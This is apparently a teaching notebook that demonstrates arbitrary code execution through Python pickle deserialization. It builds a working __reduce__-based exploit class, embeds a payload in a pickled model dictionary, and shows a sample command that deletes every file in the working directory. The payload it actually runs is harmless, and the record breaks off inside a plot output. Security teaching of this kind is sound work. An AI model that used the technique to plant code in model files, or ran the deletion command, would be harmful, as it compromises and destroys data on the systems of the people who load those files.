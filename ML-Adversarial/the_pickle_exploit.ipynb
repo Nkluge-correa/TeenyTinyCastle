{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "Vqprk82kmirW"
   },
   "source": [
    "# Exploiting pickle serialization\n",
    "\n",
    "<a href=\"https://colab.research.google.com/drive/1-xZDB44n_kgOaOqT3EcSPoPPsj_1BPbI\" target=\"_blank\">\n",
    "  <img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\">\n",
    "</a>\n",
    "\n",
    "Return to the [castle](https://github.com/Nkluge-correa/teeny-tiny_castle).\n",
    "\n",
    "[Python](https://www.python.org/) is one of the main programming languages used for _data science_ and _machine learning_ purposes. As such, developers using this language must be aware of the types of vulnerabilities that Python presents.\n",
    "\n",
    "The pickle module in Python has a potential exploit as it can be used to execute arbitrary code when loading a pickled object. Pickle is a Python module used to serialize and deserialize Python objects, allowing them to be stored or transmitted as a byte stream.\n",
    "\n",
    "However, suppose an attacker gains control of the pickled object. In that case, they may be able to inject malicious code into the object that is executed when it is loaded with the pickle module. This can be particularly dangerous when the pickled object is an ML model, i.e., something commonly downloaded and used in places like [Hugging Face](https://huggingface.co/). Although the [safe-tensors](https://huggingface.co/docs/safetensors/index) data type prevents malicious code execution, [PyTorch is also introducing](https://pytorch.org/docs/stable/generated/torch.load.html) new features for safe serialization.\n",
    "\n",
    "![pickle](https://media3.giphy.com/media/JmPenP1svctdfDCEHi/giphy.gif)\n",
    "\n",
    "[Source](https://giphy.com/explore/pickle-rick)\n",
    "\n",
    "First, Let us define a malicious Python executable we want to run. However, _anything that Python can execute can be made into a payload_ (e.g., batch/shell code). For example:\n",
    "\n",
    "```Python\n",
    "\n",
    "import os\n",
    "os.system('''for /F \"delims=\" %%i in ('dir /b') do (rmdir \"%%i\" /s/q || del \"%%i\" /s/q)''')\n",
    "\n",
    "```\n",
    "\n",
    "This payload will delete all files and directories in the current working directory of some poor soul. But let's do something more pythonic and less evil."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "id": "y1TtMAAcmirZ"
   },
   "outputs": [],
   "source": [
    "\n",
    "def foo():\n",
    "    \"\"\"\n",
    "    Creates 10 directories named \"HA\", \"HAHA\", \"HAHAHA\", ..., \"HAHAHAHAHA\" using os.mkdir.\n",
    "    Opens the Github page \"https://github.com/Nkluge-correa/teeny-tiny_castle\"\n",
    "    using webbrowser.open. Deletes the os and webbrowser modules from sys.modules.\n",
    "\n",
    "    Returns:\n",
    "        None\n",
    "    \"\"\"\n",
    "    import os\n",
    "    for i in range(1, 11):\n",
    "        os.mkdir(f'{\"HA\" * i}')\n",
    "\n",
    "    import webbrowser\n",
    "    webbrowser.open(\"https://github.com/Nkluge-correa/teeny-tiny_castle\")\n",
    "\n",
    "    import sys\n",
    "    del sys.modules[\"os\"]\n",
    "    del sys.modules[\"webbrowser\"]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "dAR7nkNCmira"
   },
   "source": [
    "This function will create a series of directories (exactly 10) titled \"HA\" and open your browser to the [`Teeny Tiny Castle` 🏰](https://github.com/Nkluge-correa/teeny-tiny_castle) repository. This could be turned into something much more harmful, but you should never create malicious code to be used against others.\n",
    "\n",
    "Let us transform this function into a string, which we will later inject into a pickle file. We can use the `inspect` module and some of its utilities for this."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "RpFKCvDYmira",
    "outputId": "6aa17b33-aace-41b8-c69d-42400fcf9809"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\"\"\"\n",
      "\n",
      "Creates 10 directories named \"HA\", \"HAHA\", \"HAHAHA\", ..., \"HAHAHAHAHA\" using os.mkdir.\n",
      "\n",
      "Opens the Github page \"https://github.com/Nkluge-correa/teeny-tiny_castle\"\n",
      "\n",
      "using webbrowser.open. Deletes the os and webbrowser modules from sys.modules.\n",
      "\n",
      "\n",
      "Returns:\n",
      "\n",
      "    None\n",
      "\n",
      "\"\"\"\n",
      "\n",
      "import os\n",
      "\n",
      "for i in range(1, 11):\n",
      "\n",
      "    os.mkdir(f'{\"HA\" * i}')\n",
      "\n",
      "\n",
      "import webbrowser\n",
      "\n",
      "webbrowser.open(\"https://github.com/Nkluge-correa/teeny-tiny_castle\")\n",
      "\n",
      "\n",
      "import sys\n",
      "\n",
      "del sys.modules[\"os\"]\n",
      "\n",
      "del sys.modules[\"webbrowser\"]\n",
      "\n"
     ]
    }
   ],
   "source": [
    "\n",
    "import inspect\n",
    "\n",
    "\"\"\"\n",
    "Turns a python function into single string.\n",
    "\n",
    "Now, something like exec(inject_src) will run this payload\n",
    "(the exec function is used when you want to execute a file or program)\n",
    "\"\"\"\n",
    "source = inspect.getsourcelines(foo)[0]\n",
    "source = source[1:]\n",
    "find_indent = len(source[0]) - len(source[0].lstrip())\n",
    "source = [line[find_indent:] for line in source]\n",
    "inject_src = \"\\n\".join(source)\n",
    "\n",
    "print(inject_src)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "lPCMVA3_mirb"
   },
   "source": [
    "The vulnerability of the pickle module poses a risk to ML engineers and practitioners given the fact that [Pytorch](https://pytorch.org/), among other libraries (e.g., [HuggingFace](https://huggingface.co/)) [use pickle to save/load a serialized objects (models) to/from disk](https://pytorch.org/docs/master/generated/torch.load.html).\n",
    "\n",
    "This vulnerability is made explicit in both the `pickle` module documentation:\n",
    "\n",
    "> **[Warning](https://docs.python.org/3/library/pickle.html): The `pickle` module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data that will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source or that could have been tampered with.**\n",
    "\n",
    "And in `Pytorch`:\n",
    "\n",
    "> **[`torch.load()`](https://pytorch.org/docs/master/generated/torch.load.html#torch.load) uses the `pickle` module implicitly, which is known to be insecure. Constructing malicious pickle data to execute arbitrary code during unpickling is possible. Never load data that could have come from an untrusted source or been tampered with. Only load data you trust.**\n",
    "\n",
    "We can inspect pickle objects with the `pickletools` as a preventive measure.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "Bek8RqcLmirb",
    "outputId": "08820cb3-ff91-432f-b3cd-04860524648e"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: \\x80 PROTO      4\n",
      "    2: \\x95 FRAME      503\n",
      "   11: X    BINUNICODE '\"\"\"\\n\\nCreates 10 directories named \"HA\", \"HAHA\", \"HAHAHA\", ..., \"HAHAHAHAHA\" using os.mkdir.\\n\\nOpens the Github page \"https://github.com/Nkluge-correa/teeny-tiny_castle\"\\n\\nusing webbrowser.open. Deletes the os and webbrowser modules from sys.modules.\\n\\n\\nReturns:\\n\\n    None\\n\\n\"\"\"\\n\\nimport os\\n\\nfor i in range(1, 11):\\n\\n    os.mkdir(f\\'{\"HA\" * i}\\')\\n\\n\\nimport webbrowser\\n\\nwebbrowser.open(\"https://github.com/Nkluge-correa/teeny-tiny_castle\")\\n\\n\\nimport sys\\n\\ndel sys.modules[\"os\"]\\n\\ndel sys.modules[\"webbrowser\"]\\n'\n",
      "  512: \\x94 MEMOIZE    (as 0)\n",
      "  513: .    STOP\n",
      "highest protocol among opcodes = 4\n"
     ]
    }
   ],
   "source": [
    "import pickletools\n",
    "import pickle\n",
    "\n",
    "with open('pickle', 'wb') as fp:\n",
    "    pickle.dump(inject_src, fp, protocol=pickle.HIGHEST_PROTOCOL)\n",
    "    fp.close()\n",
    "\n",
    "import os\n",
    "os.popen('python -mpickle pickle').read()\n",
    "\n",
    "my_pickle = pickle.dumps(inject_src)\n",
    "\n",
    "pickletools.dis(my_pickle)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "4pvUveDQmirb"
   },
   "source": [
    "Here, we can see the contents of this pickle file. But a string alone cannot execute code. We need something that will _execute_ the contents of this string when a pickle file is loaded.\n",
    "\n",
    "`Pickle` allows you to define custom behavior for the pickling process for your class instances. We would need to implement the `__reduce___ method to get code execution.\n",
    "\n",
    "> The `__reduce__()` method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the \"_reduce value_\"). [...] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order: (1) a callable object that will be called to create the initial version of the object; (2) a tuple of arguments for the callable object; and (3) an empty tuple must be given if the callable does not accept any argument.\n",
    "\n",
    "Thus, by implementing `__reduce__` in a class in which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this to get our code executed.\n",
    "\n",
    "Here we create a class that takes as its argument a dictionary and a string (our payload), and returns a dictionary and the evaluation (`eval`) of an executing function (`exec`) that runs our payload through the `__reduce__` method."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "id": "Skr8ej8Cmirb"
   },
   "outputs": [],
   "source": [
    "class EXPLOIT(dict):\n",
    "    \"\"\"\n",
    "    The EXPLOIT class is a subclass of dict. It initializes an\n",
    "    instance with an inject_src string and any additional keyword\n",
    "    arguments passed to it. The inject_src string is stored in the\n",
    "    instance as _inject_src. The reduce() method is overridden to allow\n",
    "    for serialization of the instance, which returns an evaluated tuple\n",
    "    of the inject_src string, a new empty dictionary and the current\n",
    "    instance's key-value pairs as an iterator. This class can be used\n",
    "    for executing arbitrary code during serialization of an instance.\n",
    "    \"\"\"\n",
    "\n",
    "    def __init__(self, inject_src: str, **kwargs):\n",
    "\n",
    "        super().__init__(**kwargs)\n",
    "        self._inject_src = inject_src\n",
    "\n",
    "    def __reduce__(self):\n",
    "        return eval, (f\"exec('''{self._inject_src}''') or dict()\",), None, None, iter(self.items())\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "MVxFHQtOmirb"
   },
   "source": [
    "Through this trickery, we can save our executable payload without activating it in the process. And when we evaluate the save object, we see that we have a code string inside an `exec` function. This function will be executed the second we load this object.\n",
    "\n",
    "Note: _the dictionary will still be intact after this process, so you can save a useful model that works when loaded but executes some malicious code in the background after the model is loaded. Bellow, we create the simplest linear model as an example_."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "GmRgOivimirc",
    "outputId": "d1c62597-3aaa-4b76-9d11-90ab3abe3904"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: \\x80 PROTO      4\n",
      "    2: \\x95 FRAME      596\n",
      "   11: \\x8c SHORT_BINUNICODE 'builtins'\n",
      "   21: \\x94 MEMOIZE    (as 0)\n",
      "   22: \\x8c SHORT_BINUNICODE 'eval'\n",
      "   28: \\x94 MEMOIZE    (as 1)\n",
      "   29: \\x93 STACK_GLOBAL\n",
      "   30: \\x94 MEMOIZE    (as 2)\n",
      "   31: X    BINUNICODE 'exec(\\'\\'\\'\"\"\"\\n\\nCreates 10 directories named \"HA\", \"HAHA\", \"HAHAHA\", ..., \"HAHAHAHAHA\" using os.mkdir.\\n\\nOpens the Github page \"https://github.com/Nkluge-correa/teeny-tiny_castle\"\\n\\nusing webbrowser.open. Deletes the os and webbrowser modules from sys.modules.\\n\\n\\nReturns:\\n\\n    None\\n\\n\"\"\"\\n\\nimport os\\n\\nfor i in range(1, 11):\\n\\n    os.mkdir(f\\'{\"HA\" * i}\\')\\n\\n\\nimport webbrowser\\n\\nwebbrowser.open(\"https://github.com/Nkluge-correa/teeny-tiny_castle\")\\n\\n\\nimport sys\\n\\ndel sys.modules[\"os\"]\\n\\ndel sys.modules[\"webbrowser\"]\\n\\'\\'\\') or dict()'\n",
      "  554: \\x94 MEMOIZE    (as 3)\n",
      "  555: \\x85 TUPLE1\n",
      "  556: \\x94 MEMOIZE    (as 4)\n",
      "  557: R    REDUCE\n",
      "  558: \\x94 MEMOIZE    (as 5)\n",
      "  559: (    MARK\n",
      "  560: \\x8c     SHORT_BINUNICODE 'model'\n",
      "  567: \\x94     MEMOIZE    (as 6)\n",
      "  568: \\x8c     SHORT_BINUNICODE 'my_model'\n",
      "  578: \\x94     MEMOIZE    (as 7)\n",
      "  579: \\x8c     SHORT_BINUNICODE 'w'\n",
      "  582: \\x94     MEMOIZE    (as 8)\n",
      "  583: G        BINFLOAT   1.0076\n",
      "  592: \\x8c     SHORT_BINUNICODE 'b'\n",
      "  595: \\x94     MEMOIZE    (as 9)\n",
      "  596: G        BINFLOAT   0.1234\n",
      "  605: u        SETITEMS   (MARK at 559)\n",
      "  606: .    STOP\n",
      "highest protocol among opcodes = 4\n"
     ]
    }
   ],
   "source": [
    "import pickletools\n",
    "my_dict = {'model': 'my_model', 'w': 1.0076, 'b': 0.1234}\n",
    "\n",
    "\n",
    "with open('bad_pickle', 'wb') as fp:\n",
    "    pickle.dump(EXPLOIT(inject_src, **my_dict), fp,\n",
    "                protocol=pickle.HIGHEST_PROTOCOL)\n",
    "    fp.close()\n",
    "\n",
    "\n",
    "my_bad_pickle = pickle.dumps(EXPLOIT(inject_src, **my_dict))\n",
    "\n",
    "pickletools.dis(my_bad_pickle)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "EJ-cdWr2mirc"
   },
   "source": [
    "⚠️Warning! ONLY EXECUTE THE NEXT CELL IF YOU WANT TO EXECUTE THE PAYLOAD (THE ONE PROVIDED IN THIS ORIGINAL NOTEBOOK IS HARMLESS).⚠️\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 560
    },
    "id": "cGXUyYtVmirc",
    "outputId": "3f97c8a7-86a3-4765-bb19-0e173a04057d"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'model': 'my_model', 'w': 1.0076, 'b': 0.1234}\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head><meta charset=\"utf-8\" /></head>\n",
       "<body>\n",
       "    <div>            <script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_SVG\"></script><script type=\"text/javascript\">if (window.MathJax && window.MathJax.Hub && window.MathJax.Hub.Config) {window.MathJax.Hub.Config({SVG: {font: \"STIX-Web\"}});}</script>                <script type=\"text/javascript\">window.PlotlyConfig = {MathJaxConfig: 'local'};</script>\n",
       "        <script charset=\"utf-8\" src=\"https://cdn.plot.ly/plotly-2.35.2.min.js\"></script>                <div id=\"38bc6c37-40f7-4a41-94d6-b5830ee21375\" class=\"plotly-graph-div\" style=\"height:525px; width:100%;\"></div>            <script type=\"text/javascript\">                                    window.PLOTLYENV=window.PLOTLYENV || {};                                    if (document.getElementById(\"38bc6c37-40f7-4a41-94d6-b5830ee21375\")) {                    Plotly.newPlot(                        \"38bc6c37-40f7-4a41-94d6-b5830ee21375\",                        [{\"mode\":\"markers\",\"name\":\"Mystery Function\",\"x\":[1.674102658657319,-2.8268988081559874,1.8217672612222786,1.879897427376585,0.028977269022420177,1.479221191665295,2.4816063253623333,3.535509119856123,3.196783138355041,-2.6111872649877976,-2.456531504028395,-3.7162269148558895,0.6463606643826857,2.084624398164514,-2.292440700022962,0.5217421787277959,1.3764995625298497,-0.4507007938223591,0.3958017957100864,2.1728275102201677,0.9912201425077717,2.5097135905933547,-2.3182509130044875,1.0537674322402804,0.2855992715389576,-0.5240668543498581,-1.2339434721060387,-0.3020361814649132,-3.523112623376679,2.236817163712813,-0.9035865434129017,-1.5940178698472875,-0.7950679184409023,0.29107797000361557,0.8782572348662502,3.284425040241302,0.5249093054709543,-2.414631426648838,2.556187420708718,-1.8394086873743114,2.4669353389795323,0.7738237333263064,-2.3250114393047965,-0.2024356047212074,3.3102319499490447,-0.9370090462976153,-1.224239533700825,2.288819232153062,-4.50099223102823,-0.34189299262521755,-1.2780906366597558,-2.8842023367227556,1.088867134792116,1.856434999974062,-1.7745491282721912,-1.1419885511832086,-2.7237266394693442,1.4938547425506536,0.4517313462297607,-2.332743379885708,-0.9833743757305905,-2.148845765466592,4.473493697759494,2.992529395042362,-2.1759545952589323,-0.9595072813958984,1.0859513253055575,0.3185905210587318,-3.8055189861878698,-0.49585805054709853,-2.7215862729795552,-1.7898376570886654,2.552120180659394,-0.4672022715740814,1.400285896290373,-2.4591933680478486,-0.8594240349227652,-1.4417922521255437,0.43205050521822513,-0.47118386447233507,-2.4587113570435633,0.2396529561522962,-0.7131023417899756,3.376281257936168,2.2296592650003153,0.03172814986002394,2.0300644272174524,-1.2981462523376819,2.543328392162646,-1.9260339337600516,-2.662956594131302,-2.2786983191084875,0.8124721759954342,1.0599112308259133,-0.750441365346246,-2.9063942203341693,-1.623763765521898,1.054807411402464,1.145248900134302,1.2305028370578943,0.3502779990312096,0.21196801396193915,1.4072008460658831,2.824955560205693,3.0408022288922036,2.707372568694277,-1.6535268134278263,-2.9644876914215486,-3.350460151794371,-1.4383024042443209,0.9557309715350949,-2.13000912978355,0.9112270027240242,-3.3895214716887785,0.39175086185372365,-0.5249840440656011,4.350579844731458,-3.5627078517938178,-4.727843847753941,0.5530755928033504,-0.2734726181058588,2.83624842492346,0.6933625152749193,-1.2121504000320351,0.26111663738960267,2.6686065621788386,-4.330138091325072,0.9857639193230191,-0.014100488227930636,1.3296873981216144,2.737999129433981,-2.1413142208251044,1.8431829983261143,-1.7119818580547332,1.3789974936400495,1.224086423184044,1.5641111060230701,1.8155322611512137,-1.5493197908727112,2.006793910023366,-0.22012145730383637,-4.90777629862538,-2.0629563328510505,-2.517199045677337,-1.0798016770719743,-5.4205535435436785,-4.700974777517826,-3.3519268407991114,-1.5903673157989668,-0.830606035798552,1.1801191410285607,-2.1377165467893726,3.6793834397152434,0.9540824927864895,-0.7683199059408993,0.1382351018544498,0.01428998640547659,0.9931954607023589,3.2233955036614814,1.8248403019937436,-1.1800864086475407,-1.3039120525528132,-0.7244982364075856,0.32746631932151976,3.0723296405133254,2.4597387722681594,-0.07511092882279637,-0.6222376138539458,1.514833542873941,1.9856661964127442,-1.889626612263124,-0.21249487147778337,-0.5025456495948475,-2.3733637074281746,-0.33479797861266153,1.2757681016486568,-1.717034211433066,-1.8256831119688808,2.7153054371271486,-2.0633146954629775,-1.1518728513740708,4.079000098113657,1.0039531925940994,-3.1544402306797266,-0.29785194882161486,3.6411767568319338,-3.177506259984758,-4.995999356343486,1.7959972756443165,1.747559356582079,-1.9916917298726686,-2.4741112073491554,0.6164726905706641,-1.0772204134274044,0.9899860321373155,-3.543040090190046,-0.3538729441047696,1.2056360926882,-3.5619567175205007,0.18974551930394873],\"y\":[0.9085091618081086,-1.254413453620665,2.4264598124982677,2.780799130996562,0.6917832297013013,0.9545527867137629,2.9439622462261856,2.6372136411681613,1.6257221523389624,-1.8868497826517432,-2.510892597846778,-3.059664445673196,-0.9109552464331733,3.158932816357177,-1.3508492675857564,1.2153377741259817,1.702709391497823,-1.634892113135288,2.533095081273477,1.9689073033333528,1.4146148755126777,2.769584068299489,-2.7612459119202124,-1.746136352025306,0.8063375440994349,-0.7449082198560095,0.5956613158661102,0.3479451002874171,-3.8857336398842177,2.1192063049159304,-1.1441378021563482,0.6630596684111496,0.5668057893392292,-0.4402980733609526,0.9724931443191565,2.5455114685868168,-0.2906678481154855,-0.7388792929265304,2.6952572997216873,-2.248894747164719,3.8509544808391363,1.1841197278261149,-2.2762163996390483,-0.8390299443897983,3.6662166565161733,-1.7615442148528109,-0.9446065057200674,3.9709550098983737,-5.077952502754315,0.48892661114666514,-2.0383211496433153,-0.569904555325067,0.8793326435573712,1.8273724401350935,-1.7349722794285787,-3.3987180233618925,-2.8622892584289956,1.99029964678547,2.3792884804420718,-2.5318450206651457,0.9324401071520977,-3.608591391478945,5.643969918447861,2.117552735567761,-3.1098423683963694,0.08490356895272522,1.603620878882106,-0.46604252151737463,-2.523303847388889,-0.660816132778215,-2.353168152805212,-2.3652893977763223,3.0666050182591595,-1.4323655021423431,2.5194701617227278,-3.9218517617654682,-0.12259229083519907,-1.1101304346739573,0.24974279525243373,-0.5774861517179366,-1.461211823686078,0.484278409433693,-2.372710938031167,2.7486715891060305,1.8932639824544277,0.6145462617008065,1.148516515275472,-1.2173985157555594,2.450439618091445,-2.1745809421604223,-2.376196860345474,-2.718271997420886,0.6603508622936224,0.655682310304641,-0.22368748855896292,-2.661662274745394,-1.5492941178025381,-1.5171328306212395,-0.8110249694743918,1.277615776068494,-0.2655133269051635,-0.413093796301714,1.873284427067005,2.3889661133627618,3.557851141303179,2.6121376483894543,-0.8510658258098996,-3.1474476774350144,-2.2072628433309305,-1.0098375606685925,1.206551799165302,-0.8746283387994938,0.5145483914597859,-4.861718561255168,1.0126065841771743,0.8567989460421483,4.202310771397066,-4.896788683818761,-4.537097234040209,1.0006102025805947,-0.7230887853388888,4.077011882740184,-0.21071394348989958,-0.35192957125343605,-0.19500161831808616,2.362752895840572,-3.5308945076335467,2.194627043794306,-0.5484063847899496,1.4871291481602482,2.9969809305704356,-4.6731043179032685,0.19113099501977038,-1.9630434910607037,2.99403286980736,1.3267080058130536,4.281607521941793,2.131665978071557,-1.6087765004706769,0.2929682404666636,-0.18714570465828223,-5.985952887228274,-0.8338464601086775,-2.640673262882516,-0.6617906075197495,-6.943967427689947,-4.673751213574353,-3.8279633919010196,-1.6630192637758807,-2.9999914618384733,0.753529378478083,-1.9986445961311965,4.241960639476912,1.3977408577434922,-1.0127911801481986,0.48388402298185285,-0.5244807487556131,1.0923011091561354,3.3122436899592174,1.9567084305515334,-0.9841749390830524,-1.5894330383888233,-1.4770547260790563,-0.6057270177208594,2.8940604888545383,2.6828237431611734,-0.2740639829395174,-0.35645319711004975,1.1400686536798905,2.960063070098758,-3.0903458303089235,-1.0455739203635994,0.6104782965958331,-1.8337893888791146,0.9808348634747941,0.5208385836414493,-0.15209224041602365,-2.055637100487063,0.9807540816578031,-2.935810193940801,-1.9955962470805297,3.0363536851151567,1.0495285489975024,-0.8734111370038455,-0.18930594418864544,2.551642895924379,-2.3015922060775615,-5.946200052917753,0.9780697700717845,1.359405425303441,-2.2322360679577424,-2.2698218594045128,1.827249224630973,-3.0716931449902134,1.449400169681054,-3.478308250775436,-0.6264416533774728,0.4939280157168995,-4.37206095829093,-0.573222627839016],\"type\":\"scatter\"},{\"name\":\"my_model = 1.0076 * x + 0.1234\",\"x\":[1.674102658657319,-2.8268988081559874,1.8217672612222786,1.879897427376585,0.028977269022420177,1.479221191665295,2.4816063253623333,3.535509119856123,3.196783138355041,-2.6111872649877976,-2.456531504028395,-3.7162269148558895,0.6463606643826857,2.084624398164514,-2.292440700022962,0.5217421787277959,1.3764995625298497,-0.4507007938223591,0.3958017957100864,2.1728275102201677,0.9912201425077717,2.5097135905933547,-2.3182509130044875,1.0537674322402804,0.2855992715389576,-0.5240668543498581,-1.2339434721060387,-0.3020361814649132,-3.523112623376679,2.236817163712813,-0.9035865434129017,-1.5940178698472875,-0.7950679184409023,0.29107797000361557,0.8782572348662502,3.284425040241302,0.5249093054709543,-2.414631426648838,2.556187420708718,-1.8394086873743114,2.4669353389795323,0.7738237333263064,-2.3250114393047965,-0.2024356047212074,3.3102319499490447,-0.9370090462976153,-1.224239533700825,2.288819232153062,-4.50099223102823,-0.34189299262521755,-1.2780906366597558,-2.8842023367227556,1.088867134792116,1.856434999974062,-1.7745491282721912,-1.1419885511832086,-2.7237266394693442,1.4938547425506536,0.4517313462297607,-2.332743379885708,-0.9833743757305905,-2.148845765466592,4.473493697759494,2.992529395042362,-2.1759545952589323,-0.9595072813958984,1.0859513253055575,0.3185905210587318,-3.8055189861878698,-0.49585805054709853,-2.7215862729795552,-1.7898376570886654,2.552120180659394,-0.4672022715740814,1.400285896290373,-2.4591933680478486,-0.8594240349227652,-1.4417922521255437,0.43205050521822513,-0.47118386447233507,-2.4587113570435633,0.2396529561522962,-0.7131023417899756,3.376281257936168,2.2296592650003153,0.03172814986002394,2.0300644272174524,-1.2981462523376819,2.543328392162646,-1.9260339337600516,-2.662956594131302,-2.2786983191084875,0.8124721759954342,1.0599112308259133,-0.750441365346246,-2.9063942203341693,-1.623763765521898,1.054807411402464,1.145248900134302,1.2305028370578943,0.3502779990312096,0.21196801396193915,1.4072008460658831,2.824955560205693,3.0408022288922036,2.707372568694277,-1.6535268134278263,-2.9644876914215486,-3.350460151794371,-1.4383024042443209,0.9557309715350949,-2.13000912978355,0.9112270027240242,-3.3895214716887785,0.39175086185372365,-0.5249840440656011,4.350579844731458,-3.5627078517938178,-4.727843847753941,0.5530755928033504,-0.2734726181058588,2.83624842492346,0.6933625152749193,-1.2121504000320351,0.26111663738960267,2.6686065621788386,-4.330138091325072,0.9857639193230191,-0.014100488227930636,1.3296873981216144,2.737999129433981,-2.1413142208251044,1.8431829983261143,-1.7119818580547332,1.3789974936400495,1.224086423184044,1.5641111060230701,1.8155322611512137,-1.5493197908727112,2.006793910023366,-0.22012145730383637,-4.90777629862538,-2.0629563328510505,-2.517199045677337,-1.0798016770719743,-5.4205535435436785,-4.700974777517826,-3.3519268407991114,-1.5903673157989668,-0.830606035798552,1.1801191410285607,-2.1377165467893726,3.6793834397152434,0.9540824927864895,-0.7683199059408993,0.1382351018544498,0.01428998640547659,0.9931954607023589,3.2233955036614814,1.8248403019937436,-1.1800864086475407,-1.3039120525528132,-0.7244982364075856,0.32746631932151976,3.0723296405133254,2.4597387722681594,-0.07511092882279637,-0.6222376138539458,1.514833542873941,1.9856661964127442,-1.889626612263124,-0.21249487147778337,-0.5025456495948475,-2.3733637074281746,-0.33479797861266153,1.2757681016486568,-1.717034211433066,-1.8256831119688808,2.7153054371271486,-2.0633146954629775,-1.1518728513740708,4.079000098113657,1.0039531925940994,-3.1544402306797266,-0.29785194882161486,3.6411767568319338,-3.177506259984758,-4.995999356343486,1.7959972756443165,1.747559356582079,-1.9916917298726686,-2.4741112073491554,0.6164726905706641,-1.0772204134274044,0.9899860321373155,-3.543040090190046,-0.3538729441047696,1.2056360926882,-3.5619567175205007,0.18974551930394873],\"y\":[1.8102258388631147,-2.724983239097973,1.959012692407568,2.017584647824647,0.15259749626699057,1.6138632727219513,2.6238665334350872,3.68577898916703,3.34447869020654,-2.507632288201705,-2.351801143459011,-3.621070239408794,0.7746730054319941,2.223867543590565,-2.186463249343136,0.6491074192861271,1.5103609592050766,-0.33072611985540906,0.522209889357483,2.312740999297841,1.1221534155908308,2.6521874138818644,-2.2124696199433216,1.1851760647253065,0.41116982600265367,-0.404649762442917,-1.1199214424940447,-0.18093165644404652,-3.426488279314342,2.3772169741570304,-0.7870538011428398,-1.482732405658127,-0.6777104346210533,0.41669016257564306,1.0083319898512337,3.432786670547136,0.6522986161925335,-2.309582625491369,2.6990144451061044,-1.7299881933983563,2.6090840475557773,0.9031047936995863,-2.219281526243513,-0.0805741153170886,3.4587897127686578,-0.8207303150494772,-1.1101437541569512,2.429614258317425,-4.411799771984045,-0.22109137936916923,-1.16440412549837,-2.7827222744818485,1.220542525016536,1.9939439059738648,-1.66463570164706,-1.0272676641722012,-2.6210269619293114,1.6286080385940387,0.5785645044611069,-2.227072229572839,-0.867448020986143,-2.041776993284138,4.630892249862467,3.1386726184446845,-2.0690918501829003,-0.8433995367345073,1.2176045553778798,0.4444118090187782,-3.7110409304828975,-0.3762265717312565,-2.6188703286541997,-1.6800404232825394,2.6949162940324056,-0.34735300883804443,1.53432806910218,-2.354483237645012,-0.7425556575881783,-1.329349873241698,0.5587340890578837,-0.35136486184232485,-2.3539975633570944,0.3648743186190537,-0.5951219195875794,3.5253409954964834,2.370004675414318,0.15536928379896012,2.1688929168643054,-1.1846121638554483,2.6860576879430824,-1.817271791656628,-2.5597950642467,-2.172616426333712,0.9420469645329995,1.1913665561801903,-0.6327447197228775,-2.805082816408709,-1.5127043701398646,1.1862239477291228,1.2773527917753227,1.3632546586195344,0.47634011182384683,0.3369789708680499,1.5412955724959838,2.9698252224632564,3.1873123258317846,2.8513486002163537,-1.542693617209878,-2.863617797876352,-3.2525236489480083,-1.325833502516578,1.0863945269187616,-2.0227971991699047,1.041552327944727,-3.2918818348736134,0.5181281684038119,-0.4055739228004997,4.5070442515514175,-3.466384431467451,-4.640375460996871,0.6806789673086558,-0.15215101000346337,2.9812039129528785,0.8220320703910087,-1.0979627430722787,0.38650112383376367,2.812287972051398,-4.239647140819143,1.116655725109874,0.10919234806153709,1.4631930223473386,2.88220792281768,-2.034188208903375,1.980591189113393,-1.6015929201759493,1.512877874591714,1.3567894800002427,1.6993983504288455,1.952730306335963,-1.437694621283344,2.145445543739544,-0.09839438037934554,-4.821675398494933,-1.9552348009807188,-2.412929758424485,-0.9646081698177214,-5.3383497504746105,-4.613302185826961,-3.2540014847891845,-1.479054107399039,-0.7135186416706211,1.3124880465003779,-2.030563192544972,3.8307467538570794,1.0847335197316668,-0.6507591372260502,0.26268568862854363,0.1377985903021582,1.1241437462036967,3.371293309489309,1.962109088288896,-1.0656550653532622,-1.1904217841522147,-0.6066044230042833,0.45335506334836334,3.219079345781227,2.601832786937398,0.04771822811815038,-0.5035666197192359,1.649746277799783,2.1241572595054814,-1.7805877745163239,-0.09070983250101454,-0.38296499653176835,-2.2680012716046285,-0.21394244325011774,1.4088639392211866,-1.6066836714399573,-1.7161583036198444,2.859341758449315,-1.9555958871484964,-1.0372270850445138,4.2334004988593215,1.1349832368578145,-3.0550139764328925,-0.17671562363265914,3.7922497001838567,-3.0782553075606423,-4.910568951451697,1.9330468549392135,1.884240807692103,-1.883428587019701,-2.3695144525250087,0.7445578830190012,-0.9620072885694528,1.1209099259815591